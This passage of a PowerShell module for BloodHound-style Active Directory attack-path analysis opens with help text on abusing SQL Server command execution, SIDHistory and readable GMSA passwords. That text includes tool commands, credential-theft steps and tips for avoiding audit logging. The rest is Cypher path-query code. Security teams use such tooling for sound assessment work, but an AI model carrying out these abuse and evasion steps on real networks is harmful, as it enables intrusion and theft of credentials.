Invoke-SQLOSR -Verbose -Command `"Whoami`" -Instance sqlserverinstance

OLE Execution Example

Invoke-SQLOSOle -Verbose -Command `"Whoami`" -Instance sqlserverinstance

CLR Execution Example

Invoke-SQLOSCLR -Verbose -Command `"Whoami`" -Instance sqlserverinstance

Custom Extended Procedure Execution Example:
1. Create a custom extended stored procedure.
Create-SQLFileXpDll -Verbose -OutFile c:	emp	est.dll -Command `"echo test > c:	emp est.txt`" -ExportName xp_test

2. Host the test.dll on a share readable by the SQL Server service account. 
Get-SQLQuery -Verbose -Query `"sp_addextendedproc 'xp_test', '\yourserveryoursharemyxp.dll'`" -Instance sqlserverinstance

3. Run extended stored procedure
Get-SQLQuery -Verbose -Query `"xp_test`" -Instance sqlserverinstance

4. Remove extended stored procedure.
Get-SQLQuery -Verbose -Query `"sp_dropextendedproc 'xp_test'`" -Instance sqlserverinstance
"
$Opsec="Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored.

View audits:
SELECT * FROM sys.dm_server_audit_status

View server specifications:

SELECT audit_id, 
a.name as audit_name, 
s.name as server_specification_name, 
d.audit_action_name, 
s.is_state_enabled, 
d.is_group, 
d.audit_action_id, 
s.create_date, 
s.modify_date 
FROM sys.server_audits AS a 
JOIN sys.server_audit_specifications AS s 
ON a.audit_guid = s.audit_guid 
JOIN sys.server_audit_specification_details AS d 
ON s.server_specification_id = d.server_specification_id


View database specifications:

SELECT a.audit_id, 
a.name as audit_name, 
s.name as database_specification_name, 
d.audit_action_name, 
d.major_id,
OBJECT_NAME(d.major_id) as object,
s.is_state_enabled, 
d.is_group, s.create_date, 
s.modify_date, 
d.audited_result 
FROM sys.server_audits AS a 
JOIN sys.database_audit_specifications AS s 
ON a.audit_guid = s.audit_guid 
JOIN sys.database_audit_specification_details AS d 
ON s.database_specification_id = d.database_specification_id


If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution.

If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made.

A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at 
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql."
$Ref=@(
'https://github.com/NetSPI/PowerUpSQL/wiki'
'https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation'
'https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver'
'https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017'
'https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/'
)
}
#################################################################################
HasSIDHistory{
$Info='The user alice has, in its SIDHistory attribute, the SID for the user bob. 

When a kerberos ticket is created for alice, it will include the SID for bob, and therefore grant alice the same privileges and permissions as bob.'
$Abuse="No special actions are needed to abuse this, as the kerberos tickets created will have all SIDs in the object's SID history attribute added to them; however, if traversing a domain trust boundary, ensure that SID filtering is not enforced, as SID filtering will ignore any SIDs in the SID history portion of a kerberos ticket. 

By default, SID filtering is not enabled for all domain trust types."
$Opsec="No opsec considerations apply to this edge."
$Ref=@(
'http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/'
'http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/'
'https://adsecurity.org/?p=1772'
'https://adsecurity.org/?tag=sidhistory'
'https://attack.mitre.org/techniques/T1178/'
'https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/'
)
}
#################################################################################
ReadGMSAPassword{
$Info='User x can retrieve the password for the GMSA.

Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute). 

The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.'
$Abuse="There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.
If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the 'HasSession' help modal for more details).
Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:

1. Build GMSAPasswordReader.exe from its source: https://github.com/rvazarkar/GMSAPasswordReader

2. Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assembly

3. Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the 'old' password and one for the 'current' password. It is possible that either value is valid:

gmsapasswordreader.exe --accountname gmsa-jkohler
At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."
$Opsec="When abusing a GMSA that is already logged onto a system, you will have the same opsec considerations as when abusing a standard user logon. For more information about that, see the 'HasSession' modal's opsec considerations tab.

When retrieving the GMSA password from Active Directory, you may generate a 4662 event on the Domain Controller; however, that event will likely perfectly resemble a legitimate event if you request the password from the same context as a computer account that is already authorized to read the GMSA password."
$Ref=@(
'https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/'
'https://www.powershellgallery.com/packages/DSInternals/'
'https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd'
'https://adsecurity.org/?p=36'
'https://adsecurity.org/?p=2535'
'https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662'
)
}
#################################################################################
        }
    if($Online){$ref|%{Start-Process $_}}
    else{Return [PSCustomObject]@{
        Edge  = $type
        Info  = $Info
        Abuse = $Abuse
        Opsec = $Opsec
        Ref   = $Ref
        }}    
    }
#End

################################################ EdgeCreate
function New-BloodHoundEdge{
<#
.Synopsis
   BloodHound Edge - Create Edge
.DESCRIPTION
   Create Edges Between nodes
.EXAMPLE
   EdgeCreate User MemberOf Group ALBINA_BRASHEAR@DOMAIN.LOCAL ADMINISTRATORS@DOMAIN.LOCAL
#>
    [CmdletBinding()]
    [Alias('New-Edge','EdgeCreate')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValuefromPipeline=0)][NodeType]$SourceType,
        [Parameter(Mandatory=1,Position=1,ValuefromPipeline=0)][EdgeType]$EdgeType,
        [Parameter(Mandatory=1,Position=2,ValuefromPipeline=0)][NodeType]$TargetType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynSourceList = @($Script:CypherDog."${SourceType}List")
        $DynTargetList = @($Script:CypherDog."${TargetType}List")
        # Prep DynP
        $DynSource = DynP -Name 'Name'  -Type 'String[]' -Mandat 1 -Pos 3 -Pipe 1 -PipeProp 1 -VSet $DynSourceList
        $DynTarget = DynP -Name 'To'    -Type 'string[]' -Mandat 1 -Pos 4 -Pipe 0 -PipeProp 0 -VSet $DynTargetList
        $DynCypher = DynP -Name 'Cypher'-Type 'Switch'   -Mandat 0 -Pos 5 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"  ,$DynSource)
        $Dico.Add("To"    ,$DynTarget)
        $Dico.Add("Cypher",$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{
        $Query = "MATCH (A:$SourceType) WHERE A.name = {SRC} MATCH (B:$TargetType) WHERE B.name = {TGT} MERGE (A)-[R:$EdgeType]->(B)"
        }
    Process{
        Foreach($SourceName in $DynSource.Value){
            Foreach($TargetName in $DynTarget.Value){
                $Param = @{
                    SRC = "$SourceName"
                    TGT = "$TargetName"
                    }}
            if(-Not$DynCypher.IsSet){Cypher $Query $Param}
            }}
    End{if($DynCypher.IsSet){ClipThis $Query $Param}}
    }
#End

################################################ EdgeRemove
function Remove-BloodHoundEdge{
<#
.Synopsis
   BloodHound Edge - Delete Edge
.DESCRIPTION
   Remove Edge between nodes
.EXAMPLE
   EdgeDelete User MemberOf Group ALBINA_BRASHEAR@DOMAIN.LOCAL ADMINISTRATORS@DOMAIN.LOCAL
#>
    [CmdletBinding(SupportsShouldProcess=1,ConfirmImpact='High')]
    [Alias('Remove-Edge','EdgeDelete')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValuefromPipeline=0)][NodeType]$SourceType,
        [Parameter(Mandatory=1,Position=1,ValuefromPipeline=0)][EdgeType]$EdgeType,
        [Parameter(Mandatory=1,Position=2,ValuefromPipeline=0)][NodeType]$TargetType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynSourceList = @($Script:CypherDog."${SourceType}List")
        $DynTargetList = @($Script:CypherDog."${TargetType}List")
        # Prep DynP
        $DynSource = DynP -Name 'Name'  -Type 'String[]' -Mandat 1 -Pos 3 -Pipe 1 -PipeProp 1 -VSet $DynSourceList
        $DynTarget = DynP -Name 'To'    -Type 'string[]' -Mandat 1 -Pos 4 -Pipe 0 -PipeProp 0 -VSet $DynTargetList
        $DynCypher = DynP -Name 'Cypher'-Type 'Switch'   -Mandat 0 -Pos 5 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"  ,$DynSource)
        $Dico.Add("To"    ,$DynTarget)
        $Dico.Add("Cypher",$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{$Query = "MATCH (A:$SourceType) WHERE A.name = {SRC} MATCH (B:$TargetType) WHERE B.name = {TGT} MATCH (A)-[R:$EdgeType]->(B) DELETE R"}
    Process{
        Foreach($SourceName in $DynSource.Value){
            Foreach($TargetName in $DynTarget.Value){
                $Param = @{
                    SRC = "$SourceName"
                    TGT = "$TargetName"
                    }}
            if(-Not$DynCypher.IsSet){Cypher $Query $Param}
            }}
    End{if($DynCypher.IsSet){ClipThis $Query $Param}}
    }
#End

#endregion ################################################


###########################################################
#region ############################################## PATH

# Get-BloodHoundPathShort
# Get-BloodHoundPathAny
# Get-BloodHoundPathCost
# Get-BloodHoundPathCheap
# Get-BloodHoundWald0IO

################################################# PathShort
function Get-BloodHoundPathShort{
<#
.Synopsis
   BloodHound Path - Get Shortest
.DESCRIPTION
   Get BloodHound Shortest/AllShortest Path
.EXAMPLE
   Path user Group ALBINA_BRASHEAR@DOMAIN.LOCAL 'SCHEMA ADMINS@DOMAIN.LOCAL'
#>
    [Cmdletbinding()]
    [OutputType([BHEdge])]
    [Alias('Get-PathShort','Path')]
    Param(
        [Parameter(Mandatory=1,Position=0)][NodeType]$SourceType,
        [Parameter(Mandatory=1,Position=1)][NodeType]$TargetType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynSourceList = @($Script:CypherDog."${SourceType}List")
        $DynTargetList = @($Script:CypherDog."${TargetType}List")
        # Prep DynP
        $DynSource  = DynP -Name 'Name'   -Type 'String[]'  -Mandat 1 -Pos 2  -Pipe 1 -PipeProp 1 -VSet ($DynSourceList+'*')
        $DynTarget  = DynP -Name 'To'     -Type 'string[]'  -Mandat 1 -Pos 3  -Pipe 0 -PipeProp 0 -VSet ($DynTargetList+'*')
        $DynEdge    = DynP -Name 'Edge'   -Type 'string[]'  -Mandat 0 -Pos 4  -Pipe 0 -PipeProp 0 -VSet @('NoDef','NoACL','NoGPO','NoSpc')
        $DynExclude = DynP -Name 'Exclude'-Type 'EdgeType[]'-Mandat 0 -Pos 5  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynInclude = DynP -Name 'Include'-Type 'EdgeType[]'-Mandat 0 -Pos 6  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynBlackL  = DynP -Name 'BlackL' -Type 'Switch'    -Mandat 0 -Pos 7  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynMax     = DynP -Name 'MaxHop' -Type 'Int'       -Mandat 0 -Pos 8  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynAll     = DynP -Name 'All'    -Type 'Switch'    -Mandat 0 -Pos 9  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynCypher  = DynP -Name 'Cypher' -Type 'Switch'    -Mandat 0 -Pos 10 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"   ,$DynSource)
        $Dico.Add("To"     ,$DynTarget)
        $Dico.Add("Edge"   ,$DynEdge)
        $Dico.Add("Exclude",$DynExclude)
        $Dico.Add("Include",$DynInclude)
        $Dico.Add("MaxHop" ,$DynMax)
        $Dico.Add("BlackL" ,$DynBlackL)
        $Dico.Add("All"    ,$DynAll)
        $Dico.Add("Cypher" ,$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{
        # Path Type
        if($DynAll.IsSet){$PType = 'allShortestPaths'}
        else{$PType = 'shortestPath'}       
        # EdgeString
        if(-Not$DynEdge.Value){$E = ':'+(GenEdgeStr -Exclude $DynExclude.Value -Include $DynInclude.Value)}
        else{$E = ':'+(GenEdgeStr $DynEdge.Value -Exclude $DynExclude.Value -Include $DynInclude.Value)}
        if($E -eq ':'){$E=$null}
        # Max Hop
        $M=$DynMax.Value
        # Blacklist
        If($DynBlackL.IsSet){$BL = " WHERE NONE(x in NODES(p) WHERE x:Blacklist)"}Else{$BL=$Null}
        }
    Process{foreach($SRC in $DynSource.Value){foreach($TGT in $DynTarget.Value){
                #  Any Source -  Any Target
                if($SRC -eq '*' -AND $TGT -eq '*'){
                    #Write-Warning "Heavy Q - No Names Specified"
                    $Query = "MATCH (A:$SourceType), (B:$TargetType), p=$PType((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    if(-Not$DynCypher.IsSet){Cypher $Query -Expand Data | ToPathObj}
                    }
                #  Any Source - Spec Target
                if($SRC -eq '*' -AND $TGT -ne '*'){
                    $Query = "MATCH (A:$SourceType), (B:$TargetType {name: {TGT}}), p=$PType((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    $Param=@{TGT="$TGT"}
                    if(-Not$DynCypher.IsSet){Cypher $Query $Param -Expand Data | ToPathObj}
                    }
                # Spec Source -  Any Target 
                if($SRC -ne '*' -AND $TGT -eq '*'){
                    $Query = "MATCH (A:$SourceType {name: {SRC}}), (B:$TargetType), p=$PType((A)-[r$E*1..$M]->(B))$BL RETURN p"
                    $Param=@{SRC="$SRC"}
                    if(-Not$DynCypher.IsSet){Cypher $Query $Param -Expand Data | ToPathObj}
                    }
                # Spec Source - Spec Source
                if($SRC -ne '*' -AND $TGT -ne '*'){
                    $Query = "MATCH (A:$SourceType {name: {SRC}}), (B:$TargetType  {name: {TGT}}), p=$PType((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    $Param=@{
                        SRC="$SRC"
                        TGT="$TGT"
                        }
                    if(-Not$DynCypher.IsSet){Cypher $Query $Param -Expand Data | ToPathObj}
                    }}}}
    End{if($DynCypher.IsSet){clipThis $Query $Param}}
    }
#End

################################################### PathAny
function Get-BloodHoundPathAny{
<#
.Synopsis
   BloodHound Path - Get Any
.DESCRIPTION
   Get 'Any' Path
.EXAMPLE
   PathAny user Group ALBINA_BRASHEAR@DOMAIN.LOCAL 'SCHEMA ADMINS@DOMAIN.LOCAL'
#>
    [Cmdletbinding()]
    [OutputType([BHEdge])]
    [Alias('Get-PathAny','PathAny')]
    Param(
        [Parameter(Mandatory=1,Position=0)][NodeType]$SourceType,
        [Parameter(Mandatory=1,Position=1)][NodeType]$TargetType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynSourceList = @($Script:CypherDog."${SourceType}List")
        $DynTargetList = @($Script:CypherDog."${TargetType}List")
        # Prep DynP
        $DynSource = DynP -Name 'Name'   -Type 'String[]'  -Mandat 1 -Pos 2 -Pipe 1 -PipeProp 1 -VSet ($DynSourceList+'*')
        $DynTarget = DynP -Name 'To'     -Type 'string[]'  -Mandat 1 -Pos 3 -Pipe 0 -PipeProp 0 -VSet ($DynTargetList+'*')
        $DynEdge   = DynP -Name 'Edge'   -Type 'string[]'  -Mandat 0 -Pos 4 -Pipe 0 -PipeProp 0 -VSet @('NoDef','NoACL','NoGPO','NoSpc')
        $DynExclude= DynP -Name 'Exclude'-Type 'EdgeType[]'-Mandat 0 -Pos 5 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynInclude= DynP -Name 'Include'-Type 'EdgeType[]'-Mandat 0 -Pos 6 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynMax    = DynP -Name 'MaxHop' -Type 'Int'       -Mandat 0 -Pos 7 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynBlackL = DynP -Name 'BlackL' -Type 'Switch'    -Mandat 0 -Pos 8 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynCypher = DynP -Name 'Cypher' -Type 'Switch'    -Mandat 0 -Pos 9 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"   ,$DynSource)
        $Dico.Add("To"     ,$DynTarget)
        $Dico.Add("Edge"   ,$DynEdge)
        $Dico.Add("Exclude",$DynExclude)
        $Dico.Add("Include",$DynInclude)
        $Dico.Add("MaxHop" ,$DynMax)
        $Dico.Add("BlackL" ,$DynBlackL)
        $Dico.Add("Cypher" ,$DynCypher)
        # Return Dico
        Return $Dico
        }
    Begin{
        # EdgeString
        if(-Not$DynEdge.Value){$E = ':'+ (GenEdgeStr -Exclude $DynExclude.Value -Include $DynInclude.Value)}
        else{$E = ':'+ (GenEdgeStr $DynEdge.Value -Exclude $DynExclude.Value -Include $DynInclude.Value)}
        # Max Hop
        $M=$DynMax.Value
        # Blacklist
        If($DynBlackL.IsSet){$BL = " WHERE NONE(x in NODES(p) WHERE x:Blacklist)"}
        }
    Process{foreach($SRC in $DynSource.Value){foreach($TGT in $DynTarget.Value){
                #  Any Source -  Any Target
                if($SRC -eq '*' -AND $TGT -eq '*'){
                    if(!$M){Write-Warning "Heavy Query - Setting MaxHop to 3";$M=3}
                    $Query = "MATCH (A:$SourceType) MATCH (B:$TargetType) MATCH p=((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    if(-Not$DynCypher.IsSet){Cypher $Query -Expand Data | ToPathObj}
                    }
                #  Any Source - Spec Target
                if($SRC -eq '*' -AND $TGT -ne '*'){
                    if(!$M){Write-Warning "Heavy Query - Setting MaxHop to 7"; $M=7}
                    $Query = "MATCH (A:$SourceType) MATCH (B:$TargetType {name: {TGT}}) MATCH p=((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    $Param=@{TGT="$TGT"}
                    if(-Not$DynCypher.IsSet){Cypher $Query $Param -Expand Data | ToPathObj}
                    }
                # Spec Source -  Any Target 
                if($SRC -ne '*' -AND $TGT -eq '*'){
                    if(!$M){Write-Warning "Heavy Query - Setting MaxHop to 7";$M=7}
                    $Query = "MATCH (A:$SourceType {name: {SRC}}) MATCH (B:$TargetType) MATCH p=((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    $Param=@{SRC="$SRC"}
                    if(-Not$DynCypher.IsSet){Cypher $Query $Param -Expand Data | ToPathObj}
                    }
                # Spec Source - Spec Source
                if($SRC -ne '*' -AND $TGT -ne '*'){
                    if(!$M){Write-Warning "Heavy Query - Setting MaxHop to 9";$M=9}
                    $Query = "MATCH (A:$SourceType {name: {SRC}}), (B:$TargetType  {name: {TGT}}), p=((A)-[r$E*1..$M]->(B))$BL RETURN DISTINCT(p)"
                    $Param=@{
                        SRC="$SRC"
                        TGT="$TGT"
                        }
                    if(-Not$DynCypher.IsSet){Cypher $Query $Param -Expand Data | ToPathObj}
                    }}}}
    End{if($DynCypher.IsSet){clipThis $Query $Param}}
    }
#End

################################################## PathCost
function Get-BloodHoundPathCost{
<#
.Synopsis
   BloodHound Path - Get Cost
.DESCRIPTION
   Get BloodHound Path Cost
.EXAMPLE
   path user group GARY_CATANIA@SUB.DOMAIN.LOCAL 'RDS ENDPOINT SERVERS@DOMAIN.LOCAL' -all | pathcost
#>
    [Alias('PathCost')]
    Param(
        [Parameter(Mandatory=1,ValueFromPipeline=1)][BHEdge]$Path
        )
    Begin{$Collection=@()}
    Process{$Collection += $Path}
    End{
        $Result = $Collection | group Id | %{
            [PSCustomObject]@{
                ID=$_.name
                Cost=($_.Group.Edge | Where {$_ -notmatch 'MemberOf'}).count
                Hop=$_.Count
                Path=$_.Group
                }}
        Return $Result | Sort Cost,Hop
        }}
#####End

################################################# PathCheap
function Get-BloodHoundPathCheap{
<#
.Synopsis
   BloodHound Path - Get Cheapest
.DESCRIPTION
   Get BloodHound Cheapest Path
.EXAMPLE
   pathcheap user group GARY_CATANIA@SUB.DOMAIN.LOCAL 'RDS ENDPOINT SERVERS@DOMAIN.LOCAL'
#>
    [Cmdletbinding()]
    [OutputType([BHEdge])]
    [Alias('Get-PathCheap','PathCheap')]
    Param(
        [Parameter(Mandatory=1,Position=0)][NodeType]$SourceType,
        [Parameter(Mandatory=1,Position=1)][NodeType]$TargetType
        )
    DynamicParam{
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        # Prep DynNamelist
        $DynSourceList = @($Script:CypherDog."${SourceType}List")
        $DynTargetList = @($Script:CypherDog."${TargetType}List")
        # Prep DynP
        $DynSource = DynP -Name 'Name'   -Type 'String'    -Mandat 1 -Pos 2  -Pipe 1 -PipeProp 1 -VSet ($DynSourceList)
        $DynTarget = DynP -Name 'To'     -Type 'string'    -Mandat 1 -Pos 3  -Pipe 0 -PipeProp 0 -VSet ($DynTargetList)
        $DynEdge   = DynP -Name 'Edge'   -Type 'string[]'  -Mandat 0 -Pos 5  -Pipe 0 -PipeProp 0 -VSet @('NoDef','NoACL','NoGPO','NoSpc')
        $DynExclude= DynP -Name 'Exclude'-Type 'EdgeType[]'-Mandat 0 -Pos 6  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynInclude= DynP -Name 'Include'-Type 'EdgeType[]'-Mandat 0 -Pos 7  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynBlackL = DynP -Name 'BlackL' -Type 'Switch'    -Mandat 0 -Pos 8  -Pipe 0 -PipeProp 0 -VSet $Null
        $DynExpand = DynP -Name 'Expand' -Type 'Int'       -Mandat 0 -Pos 9  -Pipe 0 -PipeProp 0 -VSet @(1..9)
        $DynCypher = DynP -Name 'Cypher' -Type 'Switch'    -Mandat 0 -Pos 10 -Pipe 0 -PipeProp 0 -VSet $Null
        $DynLimit  = DynP -Name 'Limit'  -Type 'Int'       -Mandat 0 -Pos 11 -Pipe 0 -PipeProp 0 -VSet $Null
        # DynP to Dico
        $Dico.Add("Name"   ,$DynSource)
        $Dico.Add("To"     ,$DynTarget)
        $Dico.Add("Edge"   ,$DynEdge)
        $Dico.Add("Exclude",$DynExclude)
        $Dico.Add("Include",$DynInclude)
        $Dico.Add('Expand', $DynExpand)
        $Dico.Add("BlackL" ,$DynBlackL)
        $Dico.Add("Cypher" ,$DynCypher)
        $Dico.Add("Limit"  ,$DynLimit)
        # Return Dico
        Return $Dico
        }
    Begin{     
        # EdgeString
        if(-Not$DynEdge.Value){$E = ':'+ (GenEdgeStr -Exclude $DynExclude.Value -Include $DynInclude.Value)}
        else{$E = ':'+ (GenEdgeStr $DynEdge.Value -Exclude $DynExclude.Value -Include $DynInclude.Value)}
        # Blacklist
        if($DynBlackL.IsSet){$BL = " WHERE NONE(x in NODES(p) WHERE x:Blacklist)"}Else{$BL=$Null}
        if($DynLimit.Value){$L=$DynLimit.Value}else{$L=1}
        }
    Process{
        # Get length Cheapest
        $Q = "MATCH (S:$SourceType {name: '$($DynSource.Value)'}), (T:$TargetType {name: '$($DynTarget.Value)'}), p=shortestPath((S)-[r$E*1..]->(T))$BL RETURN LENGTH(p)" 
        try{$Max = (Cypher $Q -Expand data)[0]}catch{}
        # if expand 
        if($Max){$Max += $DynExpand.value
            # Query Cheapest all path max length
            $Q = "MATCH (S:$SourceType {name: '$($DynSource.Value)'}), 
(T:$TargetType {name: '$($DynTarget.Value)'}), 
p=((S)-[r$E*1..$Max]->(T))$BL 
WITH p,
LENGTH(FILTER(x IN EXTRACT(r in RELATIONSHIPS(p)|TYPE(r)) WHERE x <>'MemberOf')) as Cost
RETURN p
ORDER BY Cost 
LIMIT $L"
            if(-Not$DynCypher.IsSet){Cypher $Q -Expand Data | TopathObj} 
            }}
    End{if($DynCypher.IsSet){clipThis $Q $Param}}
    }
#End



################################################# Wald0IO
Class Wald0IO{
    [String]$Domain
    [String]$Type
    [Int]$Total
    [String]$Direction
    $Target                   
    [Int]$Count
    [Float]$Percent
    [Float]$Hop
    [Float]$Touch
    [Float]$Cost
    }


function Get-BloodHoundWald0IO{
<#
.Synopsis
   BloodHound Path - Get Wald0 Index
.DESCRIPTION
   Calculate wald0 Index for specified Group
.EXAMPLE
   Node Group ADMINISTRATORS@DOMAIN.LOCAL | Wlad0IO
#>
    [CmdletBinding()]
    [Alias('Get-Wald0IO','Wald0IO')]
    Param(
        [Parameter(ValueFromPipeline=1,ValueFromPipelineByPropertyName=1,Mandatory=0,Position=0)][Alias('TargetGroup')][String]$Name,
        [ValidateSet('Inbound','Outbound')]
        [Parameter(Mandatory=0,Position=1)][String]$Direction,
        [ValidateSet('User','Computer')]
        [Parameter(Mandatory=0,Position=2)][String]$Type,
        [ValidateSet('NoDef','NoACL','NoGPO','NoSpc')]
        [Parameter(Mandatory=0,Position=3)][String[]]$Edge,
        [Parameter(Mandatory=0)][EdgeType[]]$Exclude,
        [Parameter(Mandatory=0)][EdgeType[]]$Include,
        [Parameter(Mandatory=0)][Switch]$DomainOnly,
        [Parameter(Mandatory=0)][Switch]$BlackL,
        [Parameter(Mandatory=0)][Switch]$Cypher
        )
    Begin{
        # EdgeString
        if($Edge.count -eq 0){$E = ':'+(GenEdgeStr -Exclude $Exclude -Include $Include)}
        else{$E = ':'+(GenEdgeStr $Edge -Exclude $Exclude -Include $Include)}
        if($E -eq ':'){$E=$null}
        # BlackL
        If($BlackL){$BL = " WHERE NONE(x in NODES(p) WHERE x:Blacklist)"}
        }
    Process{
        $Splat = @{} 
        $PSBoundParameters.Keys -notmatch "Name|Direction|Type" | %{$Splat.add($_,$PSBoundParameters.$_)}
        if(-Not$Type -AND -Not$Direction){
            Get-Wald0IO -Name $Name -Direction Inbound -Type User @Splat
            Get-Wald0IO -Name $Name -Direction Outbound -Type Computer @Splat
            }
        elseif($Direction -AND -Not$Type){
            Get-Wald0IO -Name $Name -Direction $Direction -Type User @Splat
            Get-Wald0IO -Name $Name -Direction $Direction -Type Computer @Splat
            }
        elseif($Type -AND -Not$Direction){
            Get-Wald0IO -Name $Name -Direction Inbound -Type $Type @Splat
            Get-Wald0IO -Name $Name -Direction Outbound -Type $type @Splat
            }
        ## ACTION ##
        elseif($Type -AND $Direction){
            # TargetFolder
            $TargetGroup = $Name
            # Split Domain
            $TargetDomain = $Name.split('@')[1]
            # Dom
            if($DomainOnly){
                $Dom=" {domain: '$TargetDomain'}"
                $Scope = "$TargetDomain"
                }
            else{$Scope='*'}
            # Query Parts Inbound|Outbound
            if($Direction -eq 'Inbound'){
                $Q1 = "p = shortestPath((x:$Type$Dom)-[r$E*1..]->(g:Group {name:'$TargetGroup'}))$BL"
                $Q2 = "MATCH (tx:$type$Dom), $Q1"
                }
            if($Direction -eq 'Outbound'){
                $Q1 = "p = shortestPath((g:Group {name:'$TargetGroup'})-[r$E*1..]->(x:$type$Dom))$BL"
                $Q2 = "MATCH (tx:$type$Dom), $Q1"
                }
            # Full Cypher Query
            $Wald0IO = "$Q2
WITH
g.name as G,
COUNT(DISTINCT(tx)) as TX,
COUNT(DISTINCT(x)) as X,
ROUND(100*AVG(LENGTH(RELATIONSHIPS(p))))/100 as H,
ROUND(100*AVG(LENGTH(FILTER(z IN EXTRACT(r IN RELATIONSHIPS(p)|TYPE(r)) WHERE z<>'MemberOf'))))/100 AS C,
ROUND(100*AVG(LENGTH(FILTER(y IN EXTRACT(n IN NODES(p)|LABELS(n)[0]) WHERE y='Computer'))))/100 AS T
WITH G,TX,X,H,C,T,
ROUND(100*(100.0*X/TX))/100 as P
RETURN {
TotalCount: TX,
PathCount:   X,
Percent:     P,
HopAvg:      H,
CostAvg:     C,
TouchAvg:    T
} AS Wald0IndexIO"
            # If Cypher > Set Clipboard
            if($Cypher){ClipThis "MATCH $Q1 RETURN p";Return}
            # Else Return Object
            else{
                # Call
                $Data = Cypher $Wald0IO -x data | Select -Expand Syncroot | select PathCount,TotalCount,Percent,HopAvg,CostAvg,TouchAvg
                Return [Wald0IO]@{
                    Domain     = $Scope
                    Type       = $Type
                    Total      = $Data.TotalCount
                    Direction  = $Direction
                    Target     = $TargetGroup                    
                    Count      = $Data.PathCount
                    Percent    = $Data.Percent
                    Hop        = $Data.HopAvg
                    Touch      = $Data.TouchAvg
                    Cost       = $Data.CostAvg
                    }}}}
    End{}###########
    }
#End


function Measure-BloodhoundWald0IOAvg{
<#
.Synopsis
   BloodHound Path - Get Wald0 Index - AVG
.DESCRIPTION
   Calculate Average Wald0 Index for specified Groups
.EXAMPLE
   Node Group ADMINISTRATORS@DOMAIN.LOCAL | Wlad0IO | wald0IOAvg
#>
    [Alias('Wald0IOAvg')]
    Param(
        [Parameter(Mandatory=1,Position=0,ValueFromPipeline=1)][Wald0IO[]]$Wald0IO
        )
    Begin{[Collections.ArrayList]$Collect=@()}
    Process{foreach($Obj in $Wald0IO){
